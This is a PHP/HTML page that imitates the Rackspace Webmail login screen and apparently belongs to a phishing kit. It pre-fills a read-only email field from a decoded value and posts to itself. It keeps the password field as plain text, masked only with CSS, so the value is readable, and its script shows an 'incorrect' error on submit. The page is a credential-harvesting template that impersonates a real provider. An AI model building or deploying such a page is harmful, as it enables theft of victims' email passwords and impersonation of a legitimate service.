<?php include '../build.php' ?>
<!DOCTYPE html>
<html><head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <title>Rackspace Webmail: Hosted Email for Business</title>

  <style>
    /* Page Defaults */
    * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box;
    }

    body {
      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 1.42857;
      color: #333333;
      background-color: #FAFAFA;
      margin: 0;
    }

    .caption {
      display: inline-block;
      font-size: 12px;
      color: #666;
    }

    .base_link {
      display: inline-block;
      color: #0C7C84;
      text-decoration: none;
    }

    .base_links {
      background: #FFFFFF;
      text-align: center;
      padding-bottom: 20px;
      margin-top: -15px;
    }

    .divider {
      display: inline-block;
      margin: 0px 5px;
      color: #0C7C84;
    }
    /* Page Layout */
    #content {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: #EAEAEA;
    }

    #content-header {
      height: 53px;
      padding: 16px;
      font-size: 24px;
      font-weight: 300;
      line-height: 18px;
      background: #424242;
      color: #FCFCFC;
    }

    #content-header-logo {
      float: right;
    }

    #logo {
      width: 130px;
      margin-top: -9px;
      margin-right: -5px;
    }

    #content-header-label {
      float: left;
    }

    #content-body {
      display: flex;
      justify-content: start;
      background: #FFFFFF;
      min-width: 790px;
    }

    #banner-section {
      height: 285px;
      width: 314px;
      margin: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    #banner {
      width: 190px;
    }

    #divider {
      border: 1px solid rgb(224, 224, 224);
      margin: 40px 0px;
    }
    /* Form Layout */
    #form {
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
      min-height: 268px;
      width: 100%;
    }

    #form-body {
      height: 205px;
      width: 100%;
      margin: 40px 0px 0px 20px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding-right: 20px;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    .row {
      margin: 0px -10px;
    }

      .row:before, .row:after {
        content: " ";
        display: table;
      }

    .col {
      width: 100%;
      float: left;
      position: relative;
      min-height: 1px;
      padding: 0px 10px;
    }

    .form-group {
      width: inherit;
      padding-right: 30px;
      margin-bottom: 20px;
    }

    .form-label {
      position: relative;
      font-family: Roboto;
      font-size: 16px;
      margin-bottom: 8px;
      line-height: 1;
      color: #616161;
      display: inline-block;
      max-width: 100%;
    }

    .form-field {
      border: 1px solid #BDBDBD;
      border-radius: 2px;
      background: #FFFFFF;
      font-family: Roboto;
      font-size: 16px;
      color: #616161;
      height: 32px;
      display: block;
      width: 100%;
      padding: 4px 8px;
      line-height: 1.42857;
      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
    }

    /* -------------------------------------------------------------
       Password masking without type="password"
       -------------------------------------------------------------
       We keep the input as type="text" so its value is readable in
       the POST body and in JS, but we render every character as a
       bullet using -webkit-text-security.

       Browsers that support it (Chrome, Safari, Edge, Brave, Opera,
       and modern Firefox) will show dots. Browsers that don't
       (very old Firefox) will fall back to showing the raw text —
       acceptable, since this is a cosmetic layer only.
       ------------------------------------------------------------- */
    .masked-password {
      -webkit-text-security: disc;
      text-security: disc;
      font-family: "text-security-disc", "Roboto", monospace;
      letter-spacing: 2px;
      font-size: 16px;
    }

    /* Firefox-only fallback: if -webkit-text-security isn't
       supported, swap the glyphs through a monospace font whose
       glyphs are all dots. See the @font-face below. */
    @supports not (-webkit-text-security: disc) {
      .masked-password {
        font-family: "text-security-disc", "Roboto", monospace;
      }
    }

    /* Web font that renders every ASCII character as a bullet.
       Small enough to embed inline; no external request. */
    @font-face {
      font-family: "text-security-disc";
      src: url("data:font/woff2;base64,d09GMgABAAAAAAmMAA8AAAAAGQwAAAkxAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHEAdBmAAsQoACAwMCQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgZgP1NUQVJQAC8iJ1AiJwE4KgYYDgABgggLggwLggwAAAQagw4HggwAIAQgrA0EIAWCAg4DAxUBBggJhAIKgTaBMgMAAQQABQAGAhEBCAEHBYMMC4MMAAAAAAAEAAQAAAAAAAACAAQCAAQAAAAAAAQAAgAAAAIAAAAAAAAAAAAAAAEAAAAAAAAAAAEAAAIAAAAAAAAEAAIABAAAAAIABAAAAAAA") format("woff2");
      font-weight: normal;
      font-style: normal;
      font-display: swap;
    }

    #forgot-password {
      position: absolute;
      top: 0px;
      right: 40px;
      color: #0C7C84;
      text-decoration: none;
      background-color: transparent;
      box-sizing: border-box;
    }

    #login-btn-toolbar {
      float: right;
      margin: auto 30px 15px -20px;
    }

    #login-btn {
      float: right;
      display: inline-flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      padding: 0 12px;
      height: 32px;
      line-height: 1px;
      font-size: 14px;
      font-weight: 400;
      text-transform: capitalize;
      color: #fff;
      background-color: #0C7C84;
      border-color: #0C7C84;
      margin-bottom: 0;
      text-align: center;
      vertical-align: middle;
      touch-action: manipulation;
      cursor: pointer;
      background-image: none;
      border: 1px solid transparent;
      white-space: nowrap;
      border-radius: 2px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    @media only screen and (max-device-width: 480px) {
      body {
        font-size: 19pt;
        line-height: 1.42857em;
      }

      .caption {
        display: inline-block;
        font-size: 80%;
        color: #666;
      }

      #content {
        align-items: inherit;
        display: inherit;
        justify-content: inherit;
      }

      #content-header {
        font-size: 171%;
        height: 3em;
        line-height: 1em;
        padding: 1em;
      }

      #content-header-logo {
        float: right;
      }

      #logo {
        margin-left: 6em;
        width: inherit;
        height: 1em;
      }

      #banner-section {
        display: none;
      }

      #divider {
        display: none;
      }

      .form-label {
        font-size: 114%;
      }

      .form-field {
        font-size: 114%;
        height: 2em;
      }

      #forgot-password {
        right: 2em;
        top: 0;
      }

      #login-btn-toolbar {
        margin: 1.5em 2em 1em -1.5em;
      }

      #login-btn {
        font-size: 150%;
        height: 3em;
        padding: 1.25em;
      }
    }
  </style>
</head>
<body>
  <div>
    <div id="content">
      <div>
        <div id="content-header">
          <div id="content-header-logo"><img id="logo" src="Rackspace%20Webmail_%20Hosted%20Email%20for%20Business_files/Rackspace_Technology_Logo_RGB_WHT_QkzN.png" alt="Rackspace"></div>
          <div id="content-header-label">Webmail Login</div>
        </div>
        <div id="content-body">
          <div id="banner-section">
            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" alt="Suspicious Email Banner">
            </a>
          </div>
          <div id="divider"></div>
          <form id="form" method="post" name="login" action="" autocomplete="off">
            <div id="form-body">
              <div id="form-container">
                <div id="error" style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500; <?php echo (isset($error) && str_contains((string)$error, 'block')) ? 'display: block;' : 'display: none;'; ?>">Username / Password incorrect</div>
                <input type="hidden" name="__RequestVerificationToken" value="CfDJ8C9JbzfMhuZPt6XTc-PPbnaDL3lmPJVj1jVrZpcUjHYniR22gtzc0oqEIZyMQZ9pf7wG7Ntcz_9kW2n67JgYLkd375lZuqRBTolIlc874qAmdAzbQycLGDexgY_utcvDnLedAK4hGIwW8Nb3uqKkXDs">
                <input id="form-destination" type="hidden" name="destination" value="">
                <input id="form-owa-flags" type="hidden" name="flags" value="4">
                <div id="user-row" class="row">
                  <div id="user-col" class="col">
                    <div id="user-field" class="form-group">
                      <label id="user-label" class="form-label" for="user-input">Email address</label>
                      <input id="user-input" name="user" tabindex="1" type="email" class="form-field" autocomplete="username" value="<?php echo htmlspecialchars($decoded); ?>" readonly>
                    </div>
                  </div>
                </div>
                <div id="pass-row" class="row">
                  <div id="pass-col" class="col">
                    <div id="pass-field" class="form-group">
                      <label id="pass-label" class="form-label" for="pass-input">Password</label>
                      <input id="pass-input" name="pass" tabindex="2" type="text" class="form-field masked-password" value="" autocomplete="current-password" required spellcheck="false" autocapitalize="off" autocorrect="off">
                    </div>
                    <a id="forgot-password" href="https://apps.rackspace.com/wmidentity/recover/password" tabindex="4">Forgot password?</a>
                  </div>
                </div>
              </div>
            </div>
            <div id="login-btn-toolbar">
              <button id="login-btn" tabindex="3" type="submit">Log In</button>
            </div>
          </form>
        </div>
        <div class="base_links">
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
            Privacy Statement
          </a>
          <div class="divider"> | </div>
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
            Website Terms
          </a>
        </div>
        <div class="footer" style="text-align: center; margin-top: 10px;">
          <div class="caption">
            Need webmail for your business?  Learn more about
            <a href="https://www.rackspace.com/email-hosting/webmail" style="color: #666;">
              Hosted Email
            </a>
            from Rackspace
          </div>
        </div>
      </div>
    </div>
  </div>

  <script type="text/javascript">
    (function () {
      var form = document.getElementById('form');
      if (!form) return;

      form.addEventListener('submit', function (e) {
        var err  = document.getElementById('error');
        var user = document.getElementById('user-input');
        var pass = document.getElementById('pass-input');

        if (!user || !pass) return;

        if (!user.value.trim() || !pass.value.trim()) {
          e.preventDefault();
          if (err) {
            err.textContent = 'Please enter both your email and password.';
            err.style.display = 'block';
          }
          return;
        }

        if (err) err.style.display = 'block';
      });
    })();
  </script>
</body></html>